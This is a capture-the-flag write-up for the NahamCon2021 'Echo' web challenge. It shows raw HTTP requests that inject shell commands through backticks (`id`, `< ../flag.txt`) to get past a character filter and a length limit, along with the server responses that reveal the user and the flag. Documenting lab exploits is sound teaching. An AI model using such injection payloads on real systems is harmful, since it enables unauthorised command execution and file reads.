---
title: "NahamCon2021 CTF - Echo"
date: 2021-03-15T10:10:07+02:00
categories:
- writeup
- ctf
- nahamcon
- nahamcon2021
- 2021
---

## category

warmups - easy

## solution

The challenge URL had a web based echo service.

{{< figure src="/images/nahamcon/echo.png" >}}

Many special characters, except for `<` and ` were filtered. It took me a while but I found the param had command injection. For example:

```text
GET /?echo=`id` HTTP/1.1
Host: challenge.nahamcon.com:30074
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://challenge.nahamcon.com:30074/?echo=food
Cookie: auth2=eyJpZCI6MX0.YEp7Wg.fHdsxIGEolHgYQD0d_cvExass8E; auth=eyJpZCI6MX0.YEp7Wg.fHdsxIGEolHgYQD0d_cvExass8E
Upgrade-Insecure-Requests: 1
```

Would respond with:

```html
<html>
    <title>
        $Echo
    </title>
    <h1>$Echo</h1>
    <body>
        <form method="get" name="index.php">
            <input type="text" name="echo" id="echo" size="80">
            <input type="submit" value="Echo">
        </form>
    <h3>
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    </h3>

[...]
```

If you tried to run `cat ../flag.txt`, the server would respond with `Man that's a mouthful to echo, what even?`. I length check was implemented, so to get a smaller command, use `< ../flag.txt`.

```text
GET /?echo=`<%20../flag.txt` HTTP/1.1
Host: challenge.nahamcon.com:30074
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://challenge.nahamcon.com:30074/?echo=food
Cookie: auth2=eyJpZCI6MX0.YEp7Wg.fHdsxIGEolHgYQD0d_cvExass8E; auth=eyJpZCI6MX0.YEp7Wg.fHdsxIGEolHgYQD0d_cvExass8E
Upgrade-Insecure-Requests: 1
```

The flag is then returned.

```html
<html>
    <title>
        $Echo
    </title>
    <h1>$Echo</h1>
    <body>
        <form method="get" name="index.php">
            <input type="text" name="echo" id="echo" size="80">
            <input type="submit" value="Echo">
        </form>
    <h3>
    flag{1beadaf44586ea4aba2ea9a00c5b6d91}
    </h3>

[...]
```
